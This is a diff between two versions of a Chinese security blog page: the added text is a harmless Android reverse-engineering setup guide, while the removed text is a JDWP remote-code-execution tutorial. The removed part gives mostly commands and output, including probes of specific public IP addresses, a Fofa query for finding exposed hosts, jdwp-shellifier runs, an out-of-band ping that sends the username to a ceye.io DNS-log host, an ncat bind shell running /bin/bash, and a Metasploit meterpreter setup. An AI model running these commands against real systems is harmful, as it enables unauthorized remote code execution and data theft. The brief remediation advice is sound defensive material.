@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>JDWP | Mr.Frame</title>
+  <title>Android软件安全测试软件_mac平台 | Mr.Frame</title>
   <meta name="keywords" content="">
-  <meta name="description" content="JDWP | Mr.Frame">
+  <meta name="description" content="Android软件安全测试软件_mac平台 | Mr.Frame">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="function doDecrypt (pwd, onError) { 	console.log(&#39;in doDecrypt&#39;); 	const txt &#x3D; document.getElementById(&#39;enc_content&#39;).innerHTML; 	let plantext; 	try { 		const bytes &#x3D; CryptoJS.AES.decrypt(txt, pwd);">
 <meta property="og:type" content="website">
@@ -1023,9 +1023,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-JDWP" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Android软件安全测试软件-mac平台" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">JDWP</h1>
+        <h1 class="article-title">Android软件安全测试软件_mac平台</h1>
     
     <div class="article-meta">
         
@@ -1035,9 +1035,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Kali">Kali</a> > 
-            
-            <a  data-rel="Kali&lt;---&gt;Exploit">Exploit</a>
+            <a  data-rel="Tools">Tools</a>
             
         </span>
         
@@ -1045,12 +1043,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-12-04 20:22:28'>2020-12-04 20:22</time>
+            Created At : <time class="date" title='Updated At: 2022-03-07 19:10:29'>2022-03-07 19:10</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:874</span>
+        <span>Count:292</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1080,7 +1078,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">JDWP远程代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fofa%E8%AF%AD%E6%B3%95"><span class="toc-text">Fofa语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="toc-text">测试是否存在</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IOActive-jdwp-shellifier%E5%88%A9%E7%94%A8"><span class="toc-text">IOActive&#x2F;jdwp-shellifier利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit%E5%88%A9%E7%94%A8"><span class="toc-text">Metasploit利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">修复建议</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%90%AD%E5%BB%BAAndroid%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83"><span class="toc-text">搭建Android程序分析环境</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"><span class="toc-text">常见逆向分析工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91Android%E6%BA%90%E7%A0%81"><span class="toc-text">编译Android源码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#macOS%E4%B8%8B%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%AF%91"><span class="toc-text">macOS下直接编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8Docker%E4%B8%AD%E7%BC%96%E8%AF%91Android%E6%BA%90%E7%A0%81-%E6%8E%A8%E8%8D%90"><span class="toc-text">在Docker中编译Android源码-推荐</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1096,89 +1094,71 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>JDWP（Java DEbugger Wire Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，</p>
-<p>通过该协议，Debugger 端可以和 target VM 通信，可以获取目标 VM的包括类、对象、线程等信息。<br>在调试Android应用程序这一场景中，</p>
+        <p>编写进度</p>
 <ul>
-<li>Debugger一般是指你的 develop machine 的某一支持 JDWP协议的工具例如 Android Studio 或者 JDB，</li>
-<li>Target JVM是指运行在你mobile设备当中的各个App（因为它们都是一个个虚拟机 Dalvik 或者 ART），</li>
-<li>JDWP Agent一般负责监听某一个端口，当有 Debugger向这一个端口发起请求的时候，Agent 就转发该请求给 target JVM并最终由该 JVM 来处理请求，并把 reply 信息返回给 Debugger 端。</li>
+<li><input checked="" disabled="" type="checkbox"> </li>
 </ul>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code>&gt;&gt;&gt;nmap -Pn -T4  -sV -p 2005 10.184.67.1
-Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
-Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-03 16:54 CST
-Nmap scan report for 10.184.67.1
-Host is up (0.043s latency).
-
-PORT     STATE SERVICE VERSION
-2005/tcp open  jdwp    Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_45
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 2.72 seconds
-
-不靠谱
-&gt;&gt;&gt;nmap -Pn -T4  -sV -p 2005  --script jdwp-exec  --script-args cmd=&quot;date&quot;  10.184.67.1
-&gt;&gt;&gt;nmap -Pn -T4  -sV -p 2005  --script jdwp-info,jdwp-inject  10.184.67.1</code></pre>
-<h2 id="JDWP远程代码执行漏洞"><a href="#JDWP远程代码执行漏洞" class="headerlink" title="JDWP远程代码执行漏洞"></a>JDWP远程代码执行漏洞</h2><p>telnnet 120.197.8.190 8000后，查看回显，如果出现“JDWP-Handshake”，则证明漏洞存在。</p>
-<p><img src="../images/jdwp-1.jpg" alt="jdwp-1"></p>
-<h3 id="Fofa语法"><a href="#Fofa语法" class="headerlink" title="Fofa语法"></a>Fofa语法</h3><p>语法：banner=”jdwp”</p>
-<p>120.197.8.190</p>
-<p><img src="../images/jdwp-2.jpg" alt="jdwp-2"></p>
-<h3 id="测试是否存在"><a href="#测试是否存在" class="headerlink" title="测试是否存在"></a>测试是否存在</h3><p>telnet/nc端口后，输入命令JDWP-Handshake<br>如果返回JDWP-Handshake，证明存在漏洞。</p>
-<pre><code>&#123; echo &quot;JDWP-Handshake&quot;; sleep 20 &#125; | telnet 221.221.221.221 10010
-&#123; echo &quot;JDWP-Handshake&quot;; sleep 1 | trap exit INT&#125; | nc 221.221.221.221 10010</code></pre>
-<h3 id="IOActive-jdwp-shellifier利用"><a href="#IOActive-jdwp-shellifier利用" class="headerlink" title="IOActive/jdwp-shellifier利用"></a><a target="_blank" rel="noopener" href="https://github.com/IOActive/jdwp-shellifier">IOActive/jdwp-shellifier</a>利用</h3><ul>
-<li>远程命令执行<br>本地执行python <a target="_blank" rel="noopener" href="http://jdwp-shellifier.py/">jdwp-shellifier.py</a> -t 120.197.8.190 -p 8000 –break-on “java.lang.String.indexOf” <strong>–cmd “whoami”</strong></li>
+<h1 id="搭建Android程序分析环境"><a href="#搭建Android程序分析环境" class="headerlink" title="搭建Android程序分析环境"></a>搭建Android程序分析环境</h1><h2 id="常见逆向分析工具"><a href="#常见逆向分析工具" class="headerlink" title="常见逆向分析工具"></a>常见逆向分析工具</h2><ul>
+<li>Adnroid Studio</li>
 </ul>
-<pre><code> ./jdwp-shellifier.py -t 10.184.67.1 -p 2005 --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;whoami&quot;
-[+] Targeting &#39;10.184.67.1:2005&#39;
-[+] Reading settings for &#39;Java HotSpot(TM) 64-Bit Server VM - 1.8.0_45&#39;
-[+] Found Runtime class: id=5456
-[+] Found Runtime.getRuntime(): id=7f9cb41916c0
-[+] Created break event id=2
-[+] Waiting for an event on &#39;java.lang.String.indexOf&#39;
-[+] Received matching event from thread 0x5542
-[+] Selected payload &#39;whoami&#39;
-[+] Command string object created id:5543
-[-] Unexpected returned type: expecting Object
-[!] Command successfully executed</code></pre>
-<p>执行whoami，显示执行成功，但是没回显，无法探知。</p>
+<pre><code class="shell">brew install --cask android-studio      # 安装Adnroid Studio</code></pre>
 <ul>
-<li>远程命令执行（回显）</li>
+<li>apktool</li>
 </ul>
-<p>本地执行python <a target="_blank" rel="noopener" href="http://jdwp-shellifier.py/">jdwp-shellifier.py</a> -t 120.197.8.190 -p 8000 –break-on “java.lang.String.indexOf” <strong>–cmd “ping `whoami`.<a href="https://link.zhihu.com/?target=http://ip.port.grqjsg.ceye.io">http://ip.port.grqjsg.ceye.io</a>“</strong></p>
-<p>得到远程主机的用户名为：root</p>
-<p><img src="../images/jdwp-3.jpg" alt="jdwp-3"></p>
+<pre><code class="shell">brew install apktool    # 提供反编译与回编译功能</code></pre>
 <ul>
-<li>反弹SHELL</li>
+<li>smali/baksmail</li>
 </ul>
-<p>安装ncat</p>
-<pre><code>./jdwp-shellifier.py -t 10.184.67.1 -p 2005 --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;sudo yum install -y nc&quot;</code></pre>
-<p>反弹shell</p>
-<pre><code>./jdwp-shellifier.py -t 10.184.67.1 -p 2005 --break-on &quot;java.lang.String.indexOf&quot; --cmd  &quot;ncat -v -l -p 7777 -e /bin/bash&quot;</code></pre>
-<p>连接shell</p>
-<pre><code>nc 10.184.67.1 7777</code></pre>
-<h3 id="Metasploit利用"><a href="#Metasploit利用" class="headerlink" title="Metasploit利用"></a>Metasploit利用</h3><p>用msfconsole启动Metasploit，并且选用exploit/multi/misc/java_jdwp_debugger漏洞利用模块。</p>
-<pre><code>Module options (exploit/multi/misc/java_jdwp_debugger):
-
-   Name              Current Setting  Required  Description
-   ----              ---------------  --------  -----------
-   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
-   RHOSTS            10.184.67.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
-   RPORT             2005             yes       The target port (TCP)
-   TMP_PATH                           no        A directory where we can write files. Ensure there is a trailing slash
-
-
-Payload options (linux/x64/meterpreter/bind_tcp):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LPORT  4444             yes       The listen port
-   RHOST  10.184.67.1      no        The target address
-</code></pre>
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
-<li> 关闭JDWP端口，或者JDWP端口不对公网开放</li>
-<li> 关闭Java的debug模式（开启该模式对服务器性能有影响）</li>
-</ol>
+<pre><code class="shell">brew install smali     # dex文件的反编译与回编译工具</code></pre>
+<ul>
+<li>dex2jar &amp; jd-gui</li>
+</ul>
+<pre><code class="shell">brew install dex2jar         # 将dex文件转成jar包
+brew install --cask jd-gui   # 查看jar包源码</code></pre>
+<ul>
+<li>jadx</li>
+</ul>
+<pre><code class="shell">brew install jadx          # 将.dex/.jar/.class反编译成.java</code></pre>
+<ul>
+<li>010 Editor</li>
+</ul>
+<pre><code class="shell">brew install --cask 010-editor    # 二进制编辑器</code></pre>
+<ul>
+<li><p>JEB</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/androguard/androguard">Androguard</a></p>
+</li>
+<li><p>集成工具 <a target="_blank" rel="noopener" href="https://github.com/Jermic/Android-Crack-Tool">Android-Crack-Tool</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/liaojack8/AndroidKiller">Android-Killer</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/rednaga/APKiD">APKiD</a></p>
+</li>
+</ul>
+<h2 id="编译Android源码"><a href="#编译Android源码" class="headerlink" title="编译Android源码"></a>编译Android源码</h2><p>下载源码</p>
+<pre><code class="shell">repo init -u https://android.googlesource.com/platform/manifest -b android-7.1.1_r1
+repo sync --force-sync  --force-broken</code></pre>
+<h3 id="macOS下直接编译"><a href="#macOS下直接编译" class="headerlink" title="macOS下直接编译"></a>macOS下直接编译</h3><p>需安装XCode命令行工具和macOS SDK</p>
+<pre><code class="shell">xcode-select --install</code></pre>
+<p>编译Android源码</p>
+<pre><code class="shell">export USE_CCACHE=1
+mkdir ccache
+export CCACHE_DIR=ccache
+prebuilts //misc/darwin-x86/ccache/ccache -M 50G
+sudo xcode-select -s /Applications/Xcode.app/Content/Developer
+export JAVA_HOME=$(/usr/libexec/java_home -v 1.8)
+source build/envsetup.sh
+lunch aosp_angler-userdebug
+make clobber
+brew uninstall curl &amp;&amp; brew install curl --with-openssl
+export PATH=$(brew --prefix curl)/bin:$PATH
+caffeinate make -j8</code></pre>
+<h3 id="在Docker中编译Android源码-推荐"><a href="#在Docker中编译Android源码-推荐" class="headerlink" title="在Docker中编译Android源码-推荐"></a>在Docker中编译Android源码-推荐</h3><pre><code class="shell">brew install --cask docker docker-toolbox</code></pre>
+<p>打开<em>Kitematic.app</em> 搜索 <code>aosp</code> 选择4.4版，点击<code>create</code> </p>
+<p>下载后</p>
+<p>修改android源码和ccache缓存位置,</p>
+<p>重启</p>
+<p>执行 <code>make -j4</code></p>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 askding@qq.com </span>
